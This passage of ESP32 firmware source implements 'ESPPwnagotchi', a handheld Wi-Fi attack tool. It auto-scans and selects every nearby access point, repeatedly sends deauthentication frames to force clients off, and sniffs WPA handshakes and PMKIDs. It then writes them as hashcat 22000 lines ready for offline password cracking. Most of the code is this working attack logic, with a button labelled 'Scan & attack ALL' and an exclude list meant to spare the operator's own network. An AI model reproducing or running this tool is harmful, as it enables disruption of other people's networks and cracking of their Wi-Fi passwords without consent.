  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return 0xFFFF;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return 0xFFFF;
  const uint8_t* eapol = frame + hdr + 8;
  int eapolLen = len - hdr - 8;
  if (eapolLen < 4 + 95) return 0xFFFF;
  if (eapol[1] != 0x03) return 0xFFFF;
  const uint8_t* keyBody = eapol + 4;
  if (keyBody[0] != 0x02) return 0xFFFF;
  outBodyOff = hdr + 8 + 4;          // absolute offset of keyBody[0]
  outBodyLen = eapolLen - 4;
  return ((uint16_t)keyBody[1] << 8) | keyBody[2];
}

static FileResult appendHandshakeToFile(const uint8_t apMac[6], const uint8_t staMac[6],
                                   const uint8_t anonce[32],
                                   const uint8_t* m2Frame, int m2Len,
                                   int m2KeyBodyOff, int m2KeyBodyLen,
                                   const char* ssid) {
  if (!sdOk) {
    sdWriteErrors++;
    Serial.println("[ESPPwn] handshake write skipped: SD not initialized");
    return WRITE_NO_SD;
  }
  File f = openHashesAppend();
  if (!f) {
    sdWriteErrors++;
    Serial.println("[ESPPwn] handshake file open FAILED — /handshakes/pmkid.22000 not writable");
    return WRITE_OPEN_FAIL;
  }
  // hashcat 22000 WPA*02 layout:
  // WPA*02*<MIC 32h>*<AP 12h>*<STA 12h>*<ESSID hex>*<ANONCE 64h>*<EAPOL hex>*<MP 2h>
  //
  // EAPOL portion = the EAPOL header (4 bytes) + EAPOL-Key body, with the
  // Key MIC field zeroed. That starts at m2KeyBodyOff - 4 in the 802.11
  // frame and runs for (4 + m2KeyBodyLen) bytes total.
  int eapolStart = m2KeyBodyOff - 4;
  int eapolLen   = 4 + m2KeyBodyLen;
  if (eapolStart < 0 || eapolStart + eapolLen > m2Len) {
    f.close();
    sdWriteErrors++;
    return WRITE_OPEN_FAIL;
  }
  // Pull the MIC out of M2 (offset 77-92 in keyBody = absolute eapolStart+4+77).
  const uint8_t* mic = m2Frame + m2KeyBodyOff + 77;

  // Build ESSID hex inline.
  char ssidHex[66]; int hi = 0;
  static const char* H = "0123456789abcdef";
  for (int i = 0; ssid[i] && hi + 2 < (int)sizeof(ssidHex); i++) {
    ssidHex[hi++] = H[(uint8_t)ssid[i] >> 4];
    ssidHex[hi++] = H[(uint8_t)ssid[i] & 0xF];
  }
  ssidHex[hi] = '\0';

  // Header up through ESSID*ANONCE*.
  f.printf("WPA*02*"
           "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"
           "*%02x%02x%02x%02x%02x%02x"
           "*%02x%02x%02x%02x%02x%02x"
           "*%s"
           "*",
           mic[0],  mic[1],  mic[2],  mic[3],
           mic[4],  mic[5],  mic[6],  mic[7],
           mic[8],  mic[9],  mic[10], mic[11],
           mic[12], mic[13], mic[14], mic[15],
           apMac[0],  apMac[1],  apMac[2],  apMac[3],  apMac[4],  apMac[5],
           staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5],
           ssidHex);
  // ANONCE (32 bytes).
  for (int i = 0; i < 32; i++) f.printf("%02x", anonce[i]);
  f.print('*');
  // EAPOL frame hex, with MIC bytes zeroed.
  int micEapolOffset = (m2KeyBodyOff + 77) - eapolStart;  // index within eapol portion
  for (int i = 0; i < eapolLen; i++) {
    uint8_t b = (i >= micEapolOffset && i < micEapolOffset + 16)
                  ? 0x00
                  : m2Frame[eapolStart + i];
    f.printf("%02x", b);
  }
  // Message pair byte (M1+M2 = 0x00).
  f.print("*00\n");
  f.flush();
  size_t writtenSize = f.size();
  f.close();
  Serial.printf("[ESPPwn] handshake saved for %02x:%02x:%02x:%02x:%02x:%02x (%s) — file now %u bytes\n",
                apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
                ssid[0] ? ssid : "(unknown SSID)", (unsigned)writtenSize);
  return WRITE_OK;
}

// Free a pending M1 slot.
static void clearPendingM1(int idx) {
  pendingM1Table[idx].used = false;
}

// Save M1's ANonce + AP/STA MACs into a free pending slot (FIFO eviction
// if full). Source frame is the captured 802.11 frame (PCAP-truncated is OK
// since ANonce sits at byte 49 — well within 160 bytes).
static void recordPendingM1(const uint8_t* frame, int keyBodyOff) {
  const uint8_t* apMac  = frame + 10;   // addr2 = transmitter = AP for M1 (fromDS)
  const uint8_t* staMac = frame + 4;    // addr1 = receiver = STA for M1
  const uint8_t* anonce = frame + keyBodyOff + 13;

  // Replace existing entry for this AP+STA if present (clients can retry).
  for (int i = 0; i < PENDING_M1_SLOTS; i++) {
    if (pendingM1Table[i].used &&
        memcmp(pendingM1Table[i].apMac,  apMac,  6) == 0 &&
        memcmp(pendingM1Table[i].staMac, staMac, 6) == 0) {
      memcpy(pendingM1Table[i].anonce, anonce, 32);
      pendingM1Table[i].timestamp = millis();
      return;
    }
  }
  // Find free slot; if none, evict oldest.
  int slot = -1;
  uint32_t oldest = 0xFFFFFFFF;
  for (int i = 0; i < PENDING_M1_SLOTS; i++) {
    if (!pendingM1Table[i].used) { slot = i; break; }
    if (pendingM1Table[i].timestamp < oldest) {
      oldest = pendingM1Table[i].timestamp;
      slot = i;
    }
  }
  if (slot < 0) return;
  memcpy(pendingM1Table[slot].apMac,  apMac,  6);
  memcpy(pendingM1Table[slot].staMac, staMac, 6);
  memcpy(pendingM1Table[slot].anonce, anonce, 32);
  pendingM1Table[slot].timestamp = millis();
  pendingM1Table[slot].used = true;
}

// Look up an M1 matching this M2's (AP, STA). For M2: addr1=AP, addr2=STA.
static int findPendingM1ForM2(const uint8_t* frame) {
  const uint8_t* apMac  = frame + 4;    // addr1 = receiver = AP for M2 (toDS)
  const uint8_t* staMac = frame + 10;   // addr2 = transmitter = STA for M2
  for (int i = 0; i < PENDING_M1_SLOTS; i++) {
    if (!pendingM1Table[i].used) continue;
    if (memcmp(pendingM1Table[i].apMac,  apMac,  6) == 0 &&
        memcmp(pendingM1Table[i].staMac, staMac, 6) == 0) return i;
  }
  return -1;
}

// Called from pwnLoop after draining each PCAP ring slot. Detects M1 (saves
// ANonce) and M2 (looks up pending, emits WPA*02 line). Does both, since a
// single ring drain may have either kind.
static void tryHarvestHandshake(const uint8_t* frame, int len) {
  int bodyOff = 0, bodyLen = 0;
  uint16_t keyInfo = parseEapolKeyHeader(frame, len, bodyOff, bodyLen);
  if (keyInfo == 0xFFFF) return;
  // M1: Pairwise=1, Ack=1, Install=0, MIC=0 → mask 0x01C8, value 0x0088
  if ((keyInfo & 0x01C8) == 0x0088) {
    recordPendingM1(frame, bodyOff);
    return;
  }
  // M2: Pairwise=1, MIC=1, Ack=0, Install=0, Secure=0 → mask 0x03C8, value 0x0108
  if ((keyInfo & 0x03C8) == 0x0108) {
    int p = findPendingM1ForM2(frame);
    if (p < 0) return;
    const uint8_t* apMac  = frame + 4;
    const uint8_t* staMac = frame + 10;
    if (hskDedupeHit(apMac)) {
      clearPendingM1(p);
      return;
    }
    char ssid[33] = "";
    ssidLookupForBssid(apMac, ssid, sizeof(ssid));
    FileResult r = appendHandshakeToFile(apMac, staMac, pendingM1Table[p].anonce,
                                          frame, len, bodyOff, bodyLen, ssid);
    if (r == WRITE_OK) {
      // Only count + dedupe if the bytes actually hit the file. If the SD
      // write failed we DON'T add to dedupe so the next M1+M2 for this AP
      // can retry — otherwise a transient SD glitch would lose the AP
      // permanently for this session.
      hskDedupeAdd(apMac);
      totalHandshake++;
      int ti = findTargetIdxByBssid(apMac);
      if (ti >= 0) perTarget[ti].handshake = 1;
    }
    clearPendingM1(p);
  }
}

static void IRAM_ATTR pwnSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf || type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  int fullLen = pkt->rx_ctrl.sig_len;            // untruncated frame length
  int bodyOff;
  if (!isEapolDataFrame(payload, fullLen, bodyOff)) return;

  eapolSeenIsr++;

  // Per-target EAPOL increment. BSSID lives at addr3 (offset 16) for typical
  // AP/STA traffic. If this frame isn't from one of our targets we still
  // copy it to the PCAP, but the per-target counter stays untouched.
  {
    int ti = findTargetIdxByBssid(payload + 16);
    if (ti >= 0) {
      // Use addr2 if frame is fromDS — that's the AP's transmit address
      // (matches our extractPMKID convention). For toDS frames addr3 still
      // identifies the BSSID, so the lookup is correct either way.
      perTarget[ti].eapol++;
    }
  }

  // Harvest PMKID against the FULL payload before we copy to the PCAP ring,
  // because the ring slot truncates at EAPOL_MAX_FRAME and the PMKID KDE
  // sits at the tail of M1 (beyond byte ~150) where the truncation hits.
  // Result lands in pmkidQ for the main loop to write to /handshakes/pmkid.22000.
  {
    uint8_t pm[16], ap[6], sta[6];
    if (extractPMKID(payload, fullLen, pm, ap, sta)) {
      portENTER_CRITICAL_ISR(&pmkidQMux);
      uint8_t nh = (pmkidQHead + 1) % PMKID_Q_SLOTS;
      if (nh != pmkidQTail) {
        PmkidEntry& s = const_cast<PmkidEntry&>(pmkidQ[pmkidQHead]);
        for (int k = 0; k < 16; k++) s.pmkid[k]  = pm[k];
        for (int k = 0; k < 6;  k++) s.apMac[k]  = ap[k];
        for (int k = 0; k < 6;  k++) s.staMac[k] = sta[k];
        pmkidQHead = nh;
      }
      portEXIT_CRITICAL_ISR(&pmkidQMux);
    }
  }

  int len = fullLen;
  if (len > EAPOL_MAX_FRAME) len = EAPOL_MAX_FRAME;

  portENTER_CRITICAL_ISR(&ringMux);
  uint8_t nextHead = (ringHead + 1) % EAPOL_RING_SLOTS;
  if (nextHead == ringTail) {
    // Drop oldest — keep newest. Advance tail one slot.
    ringTail = (ringTail + 1) % EAPOL_RING_SLOTS;
  }
  CapFrame& slot = const_cast<CapFrame&>(ring[ringHead]);
  slot.len = len;
  uint64_t now_us = esp_timer_get_time();
  slot.ts_sec  = (uint32_t)(now_us / 1000000ULL);
  slot.ts_usec = (uint32_t)(now_us % 1000000ULL);
  for (int i = 0; i < len; i++) slot.data[i] = payload[i];
  ringHead = nextHead;
  portEXIT_CRITICAL_ISR(&ringMux);
}

// ─── Frame TX helpers ───────────────────────────────────────────────────────

static void sendDeauth(const uint8_t bssid[6]) {
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }
  for (int b = 0; b < 4; b++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    totalDeauth++;
  }
}

// (CSA send removed — was lure-only, didn't help with PMKID/handshake.)

// ─── Target rotation ────────────────────────────────────────────────────────

static int findNextSelected(int startFrom) {
  int n = TargetList::targetCount;
  if (n <= 0) return -1;
  for (int i = 0; i < n; i++) {
    int idx = (startFrom + i) % n;
    if (TargetList::targets[idx].selected) return idx;
  }
  return -1;
}

static void enterPhase(Phase newPhase) {
  phase = newPhase;
  phaseStartedAt = millis();
  if (cursor >= 0 && cursor < TargetList::targetCount) {
    uint8_t ch = TargetList::targets[cursor].channel;
    if (ch == 0) ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
}

// Start a 10-second channel-hopping scan that fills TargetList with every AP
// the radio hears. Stops any in-flight attack first, switches the promiscuous
// filter from Data to Mgmt, and runs until SCAN_DURATION_MS elapses (handled
// in pwnLoop). When the scan finishes, all discovered APs are auto-selected
// and the attack rotation begins from index 0.
static void beginAutoScan() {
  Serial.println("[ESPPwn] auto-scan: clearing targets and sweeping ch1..11 for 25s");
  attackActive = false;
  cursor = -1;
  TargetList::clearTargets();
  resetPerTargetStats();
  switchToScanMode();
  scanChannel = 1;
  esp_wifi_set_channel(scanChannel, WIFI_SECOND_CHAN_NONE);
  scanLastHopMs = millis();
  scanLastFoundMs = millis();
  scanLastFoundCount = 0;
  phase = PH_SCAN;
  phaseStartedAt = millis();
}

static void finishAutoScan() {
  int sel = 0, excl = 0;
  for (int i = 0; i < TargetList::targetCount; i++) {
    if (isExcluded(TargetList::targets[i].ssid)) {
      TargetList::targets[i].selected = false;
      excl++;
    } else {
      TargetList::targets[i].selected = true;
      sel++;
    }
  }
  Serial.printf("[ESPPwn] auto-scan complete: %d APs, %d selected, %d excluded\n",
                TargetList::targetCount, sel, excl);
  switchToCaptureMode();
  writeTargetsSidecar();
  cursor = findNextSelected(0);
  if (cursor >= 0) {
    attackActive = true;
    enterPhase(PH_DEAUTH);
  } else {
    attackActive = false;
    phase = PH_IDLE;
  }
}

// ─── UI ─────────────────────────────────────────────────────────────────────

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1); tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("ESPPwn %d P:%u H:%u",
             TargetList::selectedCount(),
             (unsigned)totalPmkid, (unsigned)totalHandshake);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1); tft.setTextSize(1);

  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("ESPPwnagotchi");
  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("deauth + PMKID/EAPOL capture");

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 80);
  tft.print("[UP]    Toggle ON/OFF");
  tft.setCursor(2, 92);
  tft.print("[DOWN]  Scan & attack ALL");
  tft.setCursor(2, 104);
  tft.print("[LEFT]  Skip current");
  tft.setCursor(2, 116);
  tft.print("[RIGHT] Exclude + skip");
  tft.setCursor(2, 128);
  tft.print("[SEL]   Exit (closes PCAP)");

  tft.setTextColor(TFT_CYAN);
  tft.setCursor(2, 142);
  tft.print("SD:");
  tft.setTextColor(sdOk ? TFT_GREEN : TFT_RED);
  tft.setCursor(30, 142);
  tft.print(sdOk ? "OK" : "NOT FOUND");

  if (sdOk && pcapPath[0]) {
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(2, 154);
    tft.printf("File: %s", pcapPath);
  }

  tft.setTextColor(TFT_CYAN);
  tft.setCursor(2, 168);
  tft.printf("Excluded: %d", excludeCount);
  tft.setCursor(2, 180);
  tft.printf("Targets:  %d", TargetList::selectedCount());
  tft.setCursor(2, 192);
  tft.printf("Deauth:   %u", (unsigned)totalDeauth);
  tft.setCursor(2, 204);
  tft.setTextColor(TFT_GREEN);
  tft.printf("EAP:%u M1:%u", (unsigned)totalEapol, (unsigned)totalM1);
  tft.setCursor(2, 216);
  tft.printf("PMK:%u HSK:%u", (unsigned)totalPmkid, (unsigned)totalHandshake);
  // SD-write error count — non-zero means writes are silently failing.
  if (sdWriteErrors > 0) {
    tft.setCursor(2, 228);
    tft.setTextColor(TFT_RED);
    tft.printf("SD WRITE ERRORS: %u", (unsigned)sdWriteErrors);
  }

  if (phase == PH_SCAN) {
    uint32_t elapsed = millis() - phaseStartedAt;
    uint32_t left = (SCAN_DURATION_MS > elapsed) ? (SCAN_DURATION_MS - elapsed) : 0;
    tft.setTextColor(TFT_YELLOW);
    tft.setCursor(2, 240);
    tft.printf("SCAN ch%d  %ds  found:%d",
               (int)scanChannel, (int)(left / 1000) + 1, TargetList::targetCount);
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(2, 254);
    tft.print("[DOWN] finish & attack now");
  } else if (TargetList::selectedCount() == 0) {
    tft.setTextColor(TFT_RED);
    tft.setCursor(2, 240);
    tft.print("No targets selected.");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 255);
    tft.print("Press DOWN to auto-scan,");
    tft.setCursor(2, 270);
    tft.print("or run AP Scan & Select.");
  } else if (cursor >= 0 && cursor < TargetList::targetCount) {
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 240);
    const char* phName =
      phase == PH_DEAUTH ? "DEAUTH" :
      phase == PH_LISTEN ? "LISTEN" :
      phase == PH_SCAN   ? "SCAN"   : "IDLE";
    tft.printf("Now: %.16s  c%d", TargetList::targets[cursor].ssid,
               (int)TargetList::targets[cursor].channel);
    tft.setTextColor(TFT_YELLOW);
    tft.setCursor(2, 252);
    tft.printf("Phase: %s", phName);
    // Per-target capture counts — what THIS network has actually given us
    // (vs. the global totals in the stats block above). Green if we've got
    // ANY crackable string out of it (PMKID or full handshake).
    uint8_t pkY  = perTarget[cursor].pmkid;
    uint8_t hsY  = perTarget[cursor].handshake;
    tft.setTextColor((pkY || hsY) ? TFT_GREEN : TFT_CYAN);
    tft.setCursor(2, 264);
    tft.printf("This: EAP:%u M1:%u P:%s H:%s",
               (unsigned)perTarget[cursor].eapol,
               (unsigned)perTarget[cursor].m1,
               pkY ? "Y" : "-",
               hsY ? "Y" : "-");
  }
}

// ─── Setup / Loop ───────────────────────────────────────────────────────────

void pwnSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  // Load the persistent exclude list from NVS before any auto-scan runs.
  loadExcludeList();

  attackActive = false;
  cursor = -1;
  phase = PH_IDLE;
  totalDeauth = totalEapol = totalM1 = totalPmkid = totalHandshake = totalDropped = 0;
  sdWriteErrors = 0;
  ringHead = ringTail = 0;
  pmkidQHead = pmkidQTail = 0;
  eapolSeenIsr = 0;
  pmkidSeenIdx = 0;
  pmkidSeenCount = 0;
  hskSeenIdx = 0;
  hskSeenCount = 0;
  for (int i = 0; i < PENDING_M1_SLOTS; i++) pendingM1Table[i].used = false;
  resetPerTargetStats();
  toggleHeldFromPrev = true;
  downHeldFromPrev = true;
  pcapPath[0] = '\0';

  // WiFi setup — needs full reset because previous features may have left
  // WiFi running in another mode (NULL after AP Scan, AP after deauth, etc.).
  // esp_wifi_init/start/set_mode are all no-ops if WiFi is already running,
  // so stop -> set_mode -> start is the only way to actually flip to AP mode.
  // We need AP mode for esp_wifi_80211_tx (deauth/CSA) AND promiscuous on
  // for the EAPOL sniffer.
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  // Filter has to be set BEFORE enabling promiscuous so the driver applies
  // it to the first packet. Data-only filter — handshake EAPOL is in Data.
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&pwnSniffer);
  esp_wifi_set_promiscuous(true);

  // SD card init — VSPI shared with TFT, touchscreen, and potentially
  // NRF24 #3 (CSN=5). Touchscreen and NRF24 features both remap VSPI
  // via the GPIO matrix (touch = 25/35/32/33, NRF24 = SS=17). We MUST
  // re-pin VSPI back to SD's set (18/19/23/5) or SD.begin() talks to
  // thin air. Also force CS high before re-init so the SD card sees a
  // clean bus on its CS edge.
  Serial.println("[ESPPwn] Initializing SD...");
  pinMode(5, OUTPUT);
  digitalWrite(5, HIGH);   // deselect: high = SD ignores SCK/MOSI
  delay(20);
  SPI.begin(18, 19, 23, 5);          // SCK=18 MISO=19 MOSI=23 CS=5
  delay(10);
  sdOk = SD.begin(5);
  if (!sdOk) {
    Serial.println("[ESPPwn] SD.begin(default) failed, retrying at 4 MHz");
    delay(50);
    SD.end();
    delay(20);
    digitalWrite(5, HIGH);
    sdOk = SD.begin(5, SPI, 4000000);
  }
  if (!sdOk) {
    Serial.println("[ESPPwn] SD.begin(4MHz) failed, retrying at 1 MHz");
    delay(50);
    SD.end();
    delay(20);
    digitalWrite(5, HIGH);
    sdOk = SD.begin(5, SPI, 1000000);
  }
  if (sdOk) {
    uint8_t cardType = SD.cardType();
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
    const char* typeStr = (cardType == CARD_NONE) ? "NONE"  :
                          (cardType == CARD_MMC)  ? "MMC"   :
                          (cardType == CARD_SD)   ? "SD"    :
                          (cardType == CARD_SDHC) ? "SDHC"  : "UNKNOWN";
    Serial.printf("[ESPPwn] SD OK: type=%s size=%lluMB\n", typeStr, cardSize);
    openPcap();
  } else {
    Serial.println("[ESPPwn] SD.begin() FAILED at all speeds — capture disabled");
    Serial.println("[ESPPwn]   If you used BLE Jammer or NRF features this session,");
    Serial.println("[ESPPwn]   try a full power-cycle (not just menu re-entry).");
  }

  Serial.println("[ESPPwn] ready, awaiting toggle");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void pwnLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  uint32_t now = millis();

  // Toggle on UP press
  bool up = !pcf.digitalRead(BTN_UP);
  if (toggleHeldFromPrev) {
    if (!up) toggleHeldFromPrev = false;
  } else if (up && now - lastBtnMs > BTN_DEBOUNCE_MS) {
    attackActive = !attackActive;
    lastBtnMs = now;
    toggleHeldFromPrev = true;
    if (attackActive) {
      cursor = findNextSelected(0);
      if (cursor >= 0) enterPhase(PH_DEAUTH);
      else attackActive = false;
    } else {
      phase = PH_IDLE;
    }
    Serial.printf("[ESPPwn] %s\n", attackActive ? "STARTED" : "STOPPED");
    drawTopStatus();
    drawInfoBlock();
  }

  // DOWN press:
  //   - while attacking/idle: start a fresh 25s auto-scan
  //   - while a scan is already running: finish the scan early and jump
  //     straight to the attack rotation (useful when you can see the
  //     "found:N" counter has stopped climbing)
  bool down = !pcf.digitalRead(BTN_DOWN);
  if (downHeldFromPrev) {
    if (!down) downHeldFromPrev = false;
  } else if (down && now - lastBtnDownMs > BTN_DEBOUNCE_MS) {
    lastBtnDownMs = now;
    downHeldFromPrev = true;
    if (phase == PH_SCAN) {
      Serial.printf("[ESPPwn] scan ended early at %ums  found=%d\n",
                    (unsigned)(now - phaseStartedAt), TargetList::targetCount);
      finishAutoScan();
    } else {
      beginAutoScan();
    }
    drawTopStatus();
    drawInfoBlock();
  }

  // LEFT = skip current target (this session only, not added to exclude list).
  // Advances cursor to the next selected target and restarts the phase cycle.
  bool left = !pcf.digitalRead(BTN_LEFT);
  if (leftHeldFromPrev) {
    if (!left) leftHeldFromPrev = false;
  } else if (left && now - lastBtnLeftMs > BTN_DEBOUNCE_MS) {
    lastBtnLeftMs = now;
    leftHeldFromPrev = true;
    if (attackActive && cursor >= 0 && cursor < TargetList::targetCount) {
      Serial.printf("[ESPPwn] skip \"%s\"\n", TargetList::targets[cursor].ssid);
      int next = findNextSelected(cursor + 1);
      if (next >= 0) {
        cursor = next;
        enterPhase(PH_DEAUTH);
        drawInfoBlock();
      }
    }
  }

  // RIGHT = add current SSID to the permanent NVS exclude list + skip.
  // Useful when the rotation hits your own network — one press and it
  // never gets attacked again on this device.
  bool right = !pcf.digitalRead(BTN_RIGHT);
  if (rightHeldFromPrev) {
    if (!right) rightHeldFromPrev = false;
  } else if (right && now - lastBtnRightMs > BTN_DEBOUNCE_MS) {
    lastBtnRightMs = now;
    rightHeldFromPrev = true;
    if (attackActive && cursor >= 0 && cursor < TargetList::targetCount) {
      addExclude(TargetList::targets[cursor].ssid);
      TargetList::targets[cursor].selected = false;
      int next = findNextSelected(cursor + 1);
      if (next >= 0 && next != cursor) {
        cursor = next;
        enterPhase(PH_DEAUTH);
      } else if (TargetList::selectedCount() == 0) {
        attackActive = false;
        phase = PH_IDLE;
      }
      drawTopStatus();
      drawInfoBlock();
    }
  }

  // Serial commands for managing the exclude list without buttons. Read
  // a line if one's available — non-blocking thanks to Serial.available().
  if (Serial.available()) {
    String line = Serial.readStringUntil('\n');
    line.trim();
    if (line.equalsIgnoreCase("EXCLUDE_LIST")) {
      Serial.printf("[ESPPwn] %d excludes:\n", excludeCount);
      for (int i = 0; i < excludeCount; i++) Serial.printf("  [%d] %s\n", i, excludeList[i]);
    } else if (line.equalsIgnoreCase("EXCLUDE_CLEAR")) {
      clearExcludes();
    } else if (line.startsWith("EXCLUDE_ADD ")) {
      String s = line.substring(12); s.trim();
      addExclude(s.c_str());
    } else if (line.startsWith("EXCLUDE_DEL ")) {
      String s = line.substring(12); s.trim();
      Serial.println(removeExclude(s.c_str()) ? "[ESPPwn] removed" : "[ESPPwn] not found");
    }
  }

  // PH_SCAN tick — channel hop + countdown. The scanSniffer callback is
  // populating TargetList in the background. When the timer expires we
  // switch back to capture mode and start attacking.
  if (phase == PH_SCAN) {
    if (now - scanLastHopMs > SCAN_HOP_DWELL_MS) {
      scanChannel = (scanChannel % 11) + 1;
      esp_wifi_set_channel(scanChannel, WIFI_SECOND_CHAN_NONE);
      scanLastHopMs = now;
    }
    if (now - phaseStartedAt >= SCAN_DURATION_MS) {
      finishAutoScan();
      drawTopStatus();
      drawInfoBlock();
    }
  }

  // Drain PCAP ring (truncated frame copies) and write to .pcap. Each
  // drain pushes lastEapolDrainMs forward — the LISTEN phase uses that
  // to know the handshake is still in progress and extends accordingly.
  // We also walk each drained frame for M1/M2 handshake assembly so we
  // can emit hashcat WPA*02 lines for APs that don't expose PMKID.
  while (ringTail != ringHead) {
    CapFrame local;
    portENTER_CRITICAL(&ringMux);
    local = const_cast<CapFrame&>(ring[ringTail]);
    ringTail = (ringTail + 1) % EAPOL_RING_SLOTS;
    portEXIT_CRITICAL(&ringMux);
    writeFrameToPcap(local);
    totalEapol++;
    lastEapolDrainMs = now;
    tryHarvestHandshake(local.data, local.len);
  }

  // Drain PMKID queue (filled in pwnSniffer against the FULL payload, so
  // these PMKIDs are intact regardless of the PCAP-ring truncation). Dedupe
  // by BSSID, look up SSID, write hashcat-format line to pmkid.22000.
  while (pmkidQTail != pmkidQHead) {
    PmkidEntry local;
    portENTER_CRITICAL(&pmkidQMux);
    local = const_cast<PmkidEntry&>(pmkidQ[pmkidQTail]);
    pmkidQTail = (pmkidQTail + 1) % PMKID_Q_SLOTS;
    portEXIT_CRITICAL(&pmkidQMux);
    if (pmkidDedupeHit(local.apMac)) continue;
    char ssid[33] = "";
    ssidLookupForBssid(local.apMac, ssid, sizeof(ssid));
    FileResult r = appendPmkidToFile(local.pmkid, local.apMac, local.staMac, ssid);
    if (r == WRITE_OK) {
      pmkidDedupeAdd(local.apMac);
      totalPmkid++;
      int ti = findTargetIdxByBssid(local.apMac);
      if (ti >= 0) perTarget[ti].pmkid = 1;
    }
  }

  if (attackActive && TargetList::selectedCount() > 0) {
    uint32_t phaseAge = now - phaseStartedAt;
    if (phase == PH_DEAUTH) {
      sendDeauth(TargetList::targets[cursor].bssid);
      if (phaseAge >= DEAUTH_MS) enterPhase(PH_LISTEN);
    } else if (phase == PH_LISTEN) {
      // Adaptive listen: always wait LISTEN_BASE_MS, then keep waiting as
      // long as EAPOL frames are still arriving for this target (handshake
      // is mid-flight — don't bail before M3/M4 land). Cap at LISTEN_MAX_MS
      // so a flooded target can't permanently stall the rotation.
      uint32_t sinceLastEapol = now - lastEapolDrainMs;
      bool baseElapsed = phaseAge >= LISTEN_BASE_MS;
      bool quietEnough = sinceLastEapol >= LISTEN_QUIET_MS;
      bool capReached  = phaseAge >= LISTEN_MAX_MS;
      if (capReached || (baseElapsed && quietEnough)) {
        if (pcapOpen) pcapFile.flush();
        int next = findNextSelected(cursor + 1);
        if (next >= 0) cursor = next;
        enterPhase(PH_DEAUTH);
      }
    }
  }

  if (now - lastUiUpdate > 400) {
    drawTopStatus();
    drawInfoBlock();
    lastUiUpdate = now;
  }

  // Refresh the sidecar text file every ~30s so per-target stats are
  // durable even if the user yanks the SD card mid-run.
  static uint32_t lastSidecarMs = 0;
  if (sdOk && pcapPath[0] && now - lastSidecarMs > 30000) {
    writeTargetsSidecar();
    lastSidecarMs = now;
  }

  delay(2);
}

}  // namespace EspPwnagotchi
